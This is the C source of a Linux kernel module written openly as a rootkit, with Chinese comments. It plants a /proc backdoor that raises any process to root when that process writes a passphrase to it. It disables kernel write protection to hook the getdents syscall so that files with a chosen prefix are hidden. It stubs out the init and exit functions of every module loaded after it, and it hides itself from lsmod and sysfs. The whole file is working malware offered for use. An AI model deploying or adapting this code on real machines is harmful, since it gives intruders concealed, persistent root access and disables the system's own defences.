/* lkm.c */

/**********************
   不要在物理机测试！
   不要在物理机测试！
   不要在物理机测试！ 
***********************/

#define DEBUG 1

#include <linux/fs.h>
#include <linux/init.h>
#include <linux/slab.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/syscalls.h>


MODULE_LICENSE("GPL");


/*
 * 0x00. 通用函数
 */

struct linux_dirent {
    unsigned long  d_ino;
    unsigned long  d_off;
    unsigned short d_reclen; // d_reclen is the way to tell the length of this entry
    char           d_name[1]; // the struct value is actually longer than this, and d_name is variable width.
};

unsigned long ** sys_call_table_address;
asmlinkage long (*real_open)(const char *, int, umode_t);

void disable_write_protection(void) {
    // 关闭写保护
    unsigned long cr0 = read_cr0();
    clear_bit(16, &cr0);
    write_cr0(cr0);
}

void enable_write_protection(void) {
    // 开启写保护
    unsigned long cr0 = read_cr0();
    set_bit(16, &cr0);
    write_cr0(cr0);
}

unsigned long ** get_sys_call_table(void){
    // 获得 sys_call_table 的内存地址
    unsigned long ** entry = (unsigned long **)PAGE_OFFSET;
    #if DEBUG
        printk(KERN_INFO "MyRootkit: PAGE_OFFSET in %p\n", (void *)PAGE_OFFSET);
    #endif
    for(;(unsigned long)entry < ULONG_MAX; entry+= 1){
        if(entry[__NR_close] == (unsigned long *) sys_close) {
            #if DEBUG
                printk(KERN_INFO "MyRootkit: SYS_CALL_TABLE in %p\n", (void *)entry);
            #endif
	        return entry;
    	}	
    }
    #if DEBUG
        printk(KERN_INFO "MyRootkit: SYS_CALL_TABLE in NULL\n");
    #endif
    return NULL;
}


/*
 * 0x01. 提供 root 后门
 */

#define AUTH "Please help me, rootkit.\n"
#define GET_ROOT_FILE "032RootkitGetRoot"
struct proc_dir_entry *entry;

ssize_t write_handler(struct file *filp, const char __user *buff, size_t count, loff_t *offp) {
    char *kbuff;
    struct cred* cred;
    
    // 分配内存
    kbuff = kmalloc(count, GFP_KERNEL);
    if (!kbuff) {
        return -ENOMEM;
    }

    // 复制文件内容到内核缓冲区
    if (copy_from_user(kbuff, buff, count)) {
        /* copy_from_user 成功返回 0 */
        kfree(kbuff);
        return -EFAULT;
    }
    kbuff[count] = '\0';

    // 验证输入的口令
    if (strlen(kbuff) == strlen(AUTH) && strncmp(AUTH, kbuff, count) == 0) {
        // 用户进程写入的内容是我们的口令
        // 把进程的 ``uid`` 与 ``gid`` 等等
        // 都设置成 ``root`` 账号的，将其提权到 ``root``
        #if DEBUG
            printk(KERN_ALERT "%s\n", "MyRootkit: Comrade, I will help you.");
        #endif
        cred = (struct cred *)__task_cred(current);
        cred->uid = cred->euid = cred->fsuid = GLOBAL_ROOT_UID;
        cred->gid = cred->egid = cred->fsgid = GLOBAL_ROOT_GID;
        #if DEBUG
            printk(KERN_ALERT "%s\n", "MyRootkit: See you!");
        #endif
    } else {
        // 密码错误，拒绝提权
        #if DEBUG
            printk(KERN_ALERT "MyRootkit: Alien, get ou of here: %s.", kbuff);
        #endif
    }

    kfree(kbuff);
    return count;
}

struct file_operations proc_fops = {
    .write = write_handler
};


/*
 * 0x02. 控制内核模块的加载
 *       (将内核模块的初始函数掉包成一个什么也不做的函数)
 */

int fake_init(void) {
    return 0;
}
void fake_exit(void) {}

int module_notifier(struct notifier_block *nb, unsigned long cation, void *data) {
    struct module *module;
    unsigned long flags;
    
    // 定义锁
    DEFINE_SPINLOCK(module_notifier_spinlock);
    
    module = data;
    #if DEBUG
        printk(KERN_ALERT "MyRootkit: Processing the module: %s\n", module->name);
    #endif
    
    //保存中断状态并加锁
    spin_lock_irqsave(&module_notifier_spinlock, flags);
    switch(module->state) {
        case MODULE_STATE_COMING:
            module->init = fake_init;
            module->exit = fake_exit;
            break;
        default:
            break;
    }
    
    // 恢复中断状态并解锁
    spin_unlock_irqrestore(&module_notifier_spinlock, flags);
    
    return NOTIFY_DONE;
}

struct notifier_block nb = {
    .notifier_call = module_notifier,
    .priority = INT_MAX
};


/*
 * 0x03. 隐藏文件
 */

# define HIDE_PREFIX "032Rootkit"
# define GETDENTS_SYSCALL_NUM 78
long (*real_getdents)(unsigned int, struct linux_dirent __user *, unsigned int);

int need_hide_file(const char * file_name) {
    if (strncmp(file_name, HIDE_PREFIX, strlen(HIDE_PREFIX)) == 0) {
        #if DEBUG
            printk(KERN_ALERT "MyRootkit: hide file: %s\n", file_name);
        #endif
        return 1;
    } else {
        return 0;
    }
}

asmlinkage long fake_getdents(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count) {
	int boff;
	struct linux_dirent* ent;
	long ret = real_getdents(fd, dirent, count);
	char* dbuf;
	if (ret <= 0) {
		return ret;
	}
	dbuf = (char*)dirent;
	// 遍历各项（entries）, 寻找要隐藏的项
	for (boff = 0; boff < ret;) {
		ent = (struct linux_dirent*)(dbuf + boff);
		if (need_hide_file(ent->d_name)) {
			// 复制此项后的所有内容至此项所在位置
			memcpy(dbuf + boff, dbuf + boff + ent->d_reclen, ret - (boff + ent->d_reclen));
			// 调整总长度
			ret -= ent->d_reclen;
		} else {
			// 继续取下一项
			boff += ent->d_reclen;
		}
	}
	return ret;
}

void fake_system_call(unsigned long ** sys_call_table) {
    disable_write_protection();
    real_getdents = (void*) sys_call_table[GETDENTS_SYSCALL_NUM];
    sys_call_table[GETDENTS_SYSCALL_NUM] = (unsigned long*)fake_getdents;
    enable_write_protection();
}

void restore_system_call(unsigned long ** sys_call_table) {
    disable_write_protection();
    sys_call_table[GETDENTS_SYSCALL_NUM] = (unsigned long*)real_getdents;
    enable_write_protection();
}


/*
 * 0xFF. init and exit
 */

static int lkm_init(void) {

    #if DEBUG
    	printk(KERN_INFO "MyRootkit: module loaded\n");
    #else
        list_del_init(&__this_module.list);     // 从lsmod命令中隐藏模块
        kobject_del(&THIS_MODULE->mkobj.kobj);  // 从sysfs中隐藏模块
    #endif
    
    // 0x01. 提供 root 后门
    entry = proc_create(GET_ROOT_FILE, S_IRUGO | S_IWUGO, NULL, &proc_fops);
    // 0x03. 隐藏文件
    sys_call_table_address = get_sys_call_table();
    fake_system_call(sys_call_table_address);
    // 0x02. 控制内核模块的加载
    register_module_notifier(&nb);
    return 0;
}

static void lkm_exit(void) {
    #if DEBUG
        printk(KERN_INFO "MyRootkit: module removed\n");
    #endif
    // 0x02. 控制内核模块的加载
    unregister_module_notifier(&nb);
    // 0x01. 提供 root 后门
    proc_remove(entry);
    // 0x03. 隐藏文件
    restore_system_call(sys_call_table_address);
}

module_init(lkm_init);
module_exit(lkm_exit);
